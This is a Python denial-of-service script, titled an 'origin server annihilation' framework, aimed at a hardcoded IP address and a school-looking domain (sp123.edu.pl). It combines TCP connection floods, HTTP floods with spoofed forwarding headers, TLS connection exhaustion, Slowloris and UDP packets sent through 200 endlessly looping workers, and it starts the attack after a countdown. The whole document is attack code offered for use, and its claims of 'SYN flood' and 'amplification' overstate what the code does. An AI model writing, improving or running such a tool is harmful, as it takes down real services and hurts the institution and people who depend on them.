#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ORIGIN_SERVER_ANNIHILATION.py
Direct IP-Based Origin Server Destruction Framework
BYPASSES ALL CDN/WAF PROTECTIONS - TARGETS ORIGIN DIRECTLY
"""

import asyncio
import aiohttp
import socket
import ssl
import random
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
import os
import psutil
import resource
import struct
import urllib3
from fake_useragent import UserAgent
import ipaddress

# DISABLE ALL PROTECTIONS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === ORIGIN SERVER TARGET ===
TARGET_IP = "116.202.161.203"
TARGET_DOMAIN = "sp123.edu.pl"

class OriginServerAssault:
    """Direct origin server assault - bypasses all CDN protections"""
    
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_domain = TARGET_DOMAIN
        self.ua = UserAgent()
        self.connection_pool = []
        self.ssl_context = self._create_ssl_context()
        
    def _create_ssl_context(self):
        """Create SSL context for direct IP connection"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context
    
    async def direct_ip_assault(self):
        """Direct IP assault bypassing DNS/CDN"""
        print(f"🎯 LAUNCHING DIRECT IP ASSAULT ON: {self.target_ip}")
        
        # Multiple attack vectors simultaneously
        tasks = [
            self._tcp_syn_flood(),
            self._http_direct_ip_flood(),
            self._ssl_exhaustion_direct(),
            self._slowloris_direct_ip(),
            self._udp_amplification()
        ]
        
        await asyncio.gather(*tasks)
    
    async def _tcp_syn_flood(self):
        """TCP SYN flood directly to IP"""
        print("🔥 STARTING TCP SYN FLOOD...")
        
        while True:
            try:
                # Create raw socket for SYN flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                # Connect to various ports
                target_ports = [80, 443, 8080, 8443, 22, 21, 25, 53, 3306, 5432]
                
                for port in target_ports:
                    try:
                        sock.connect((self.target_ip, port))
                        # Immediately close to exhaust connection tables
                        sock.close()
                    except:
                        pass
                    
                    # Create new socket for next connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                
            except Exception as e:
                # Continue assault regardless of errors
                pass
    
    async def _http_direct_ip_flood(self):
        """HTTP flood directly to IP address"""
        print("🌊 STARTING DIRECT IP HTTP FLOOD...")
        
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            use_dns_cache=False,
            ssl=False
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                try:
                    # Direct IP access with Host header spoofing
                    headers = {
                        'Host': self.target_domain,
                        'User-Agent': self.ua.random,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'no-cache',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    
                    # Target both HTTP and HTTPS directly via IP
                    urls = [
                        f"http://{self.target_ip}/",
                        f"http://{self.target_ip}/index.html",
                        f"http://{self.target_ip}/wp-admin",
                        f"https://{self.target_ip}/",
                        f"https://{self.target_ip}/index.php"
                    ]
                    
                    for url in urls:
                        try:
                            async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                                print(f"✅ Direct IP hit: {response.status}")
                        except Exception as e:
                            print(f"💥 Direct IP crash: {e}")
                            
                except Exception as e:
                    # Continue assault
                    pass
    
    async def _ssl_exhaustion_direct(self):
        """SSL/TLS exhaustion directly to IP"""
        print("🔐 STARTING SSL EXHAUSTION DIRECT...")
        
        while True:
            try:
                # Create SSL connection directly to IP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, 443))
                
                # Wrap with SSL
                ssl_sock = self.ssl_context.wrap_socket(sock, server_hostname=self.target_domain)
                
                # Send some data to complete handshake
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_domain.encode() + b"\r\n\r\n")
                
                # Don't close - keep connection open to exhaust resources
                self.connection_pool.append(ssl_sock)
                
                # Limit pool size to avoid memory issues
                if len(self.connection_pool) > 1000:
                    old_sock = self.connection_pool.pop(0)
                    try:
                        old_sock.close()
                    except:
                        pass
                        
            except Exception as e:
                # Continue assault
                pass
    
    async def _slowloris_direct_ip(self):
        """Slowloris attack directly to IP"""
        print("🐌 STARTING SLOWLORIS DIRECT IP...")
        
        while True:
            try:
                # Create multiple partial connections
                socks = []
                for i in range(100):  # 100 connections per cycle
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((self.target_ip, 80))
                        
                        # Send partial HTTP request
                        partial_headers = f"GET / HTTP/1.1\r\nHost: {self.target_domain}\r\n"
                        sock.send(partial_headers.encode())
                        
                        socks.append(sock)
                    except:
                        continue
                
                # Hold connections open
                await asyncio.sleep(30)
                
                # Close connections
                for sock in socks:
                    try:
                        sock.close()
                    except:
                        pass
                        
            except Exception as e:
                # Continue assault
                pass
    
    async def _udp_amplification(self):
        """UDP amplification attacks"""
        print("📡 STARTING UDP AMPLIFICATION...")
        
        while True:
            try:
                # DNS amplification (query to open DNS resolvers for target domain)
                dns_query = bytearray()
                dns_query.extend(b'\x12\x34')  # Transaction ID
                dns_query.extend(b'\x01\x00')  # Flags
                dns_query.extend(b'\x00\x01')  # Questions
                dns_query.extend(b'\x00\x00')  # Answer RRs
                dns_query.extend(b'\x00\x00')  # Authority RRs
                dns_query.extend(b'\x00\x00')  # Additional RRs
                
                # Add query for target domain
                for part in self.target_domain.split('.'):
                    dns_query.append(len(part))
                    dns_query.extend(part.encode())
                
                dns_query.extend(b'\x00')  # End of domain name
                dns_query.extend(b'\x00\x01')  # Type A
                dns_query.extend(b'\x00\x01')  # Class IN
                
                # Send to target IP on DNS port
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(bytes(dns_query), (self.target_ip, 53))
                sock.close()
                
            except Exception as e:
                # Continue assault
                pass

class MultiVectorOrchestrator:
    """Orchestrates multi-vector direct IP assault"""
    
    def __init__(self, num_workers=100):
        self.num_workers = num_workers
        self.workers = []
        self.assault_start = time.time()
    
    async def launch_multi_vector_assault(self):
        """Launch coordinated multi-vector assault"""
        print("💀 INITIATING MULTI-VECTOR ORIGIN SERVER ASSAULT")
        print(f"🎯 TARGET IP: {TARGET_IP}")
        print(f"🌐 TARGET DOMAIN: {TARGET_DOMAIN}")
        print(f"👥 ASSAULT WORKERS: {self.num_workers}")
        print("🚀 BYPASSING ALL CDN/WAF PROTECTIONS")
        
        # Create and start assault workers
        tasks = []
        for i in range(self.num_workers):
            assault = OriginServerAssault()
            task = asyncio.create_task(assault.direct_ip_assault())
            tasks.append(task)
            print(f"✅ Worker {i+1} deployed")
        
        # Start monitoring
        monitor_task = asyncio.create_task(self._assault_monitor())
        tasks.append(monitor_task)
        
        # Run for maximum impact
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print("\n🛑 ASSAULT INTERRUPTED BY USER")
        except Exception as e:
            print(f"💥 ASSAULT ERROR: {e}")
    
    async def _assault_monitor(self):
        """Monitor assault progress"""
        start_time = time.time()
        
        while True:
            elapsed = time.time() - start_time
            print(f"\r⏱️  ASSAULT DURATION: {elapsed:.1f}s | TARGET: {TARGET_IP} | STATUS: DESTROYING", end="", flush=True)
            await asyncio.sleep(1)

# === QUICK TEST FUNCTION ===
async def quick_test_connectivity():
    """Quick test to verify target is reachable"""
    print("🔍 TESTING TARGET CONNECTIVITY...")
    
    try:
        # Test HTTP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_IP, 80))
        if result == 0:
            print("✅ HTTP (Port 80) - ACCEPTING CONNECTIONS")
        else:
            print("❌ HTTP (Port 80) - FILTERED/CLOSED")
        sock.close()
        
        # Test HTTPS
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_IP, 443))
        if result == 0:
            print("✅ HTTPS (Port 443) - ACCEPTING CONNECTIONS")
        else:
            print("❌ HTTPS (Port 443) - FILTERED/CLOSED")
        sock.close()
        
        # Test SSH (common admin port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_IP, 22))
        if result == 0:
            print("✅ SSH (Port 22) - ACCEPTING CONNECTIONS")
        else:
            print("❌ SSH (Port 22) - FILTERED/CLOSED")
        sock.close()
            
    except Exception as e:
        print(f"❌ CONNECTIVITY TEST FAILED: {e}")

async def main():
    """Main execution function"""
    print("="*80)
    print("💀 ORIGIN SERVER DIRECT IP ASSAULT FRAMEWORK")
    print("="*80)
    
    # Quick connectivity test
    await quick_test_connectivity()
    
    print("\n🚀 INITIATING DIRECT IP ASSAULT IN 5 SECONDS...")
    print("⚠️  THIS WILL TARGET THE ORIGIN SERVER DIRECTLY")
    print("⚠️  BYPASSING ALL CDN, WAF, AND DNS PROTECTIONS")
    
    for i in range(5, 0, -1):
        print(f"⏰ {i}...")
        await asyncio.sleep(1)
    
    # Launch assault
    orchestrator = MultiVectorOrchestrator(num_workers=200)
    await orchestrator.launch_multi_vector_assault()

if __name__ == "__main__":
    # Increase system limits for maximum performance
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    except:
        pass
    
    asyncio.run(main())
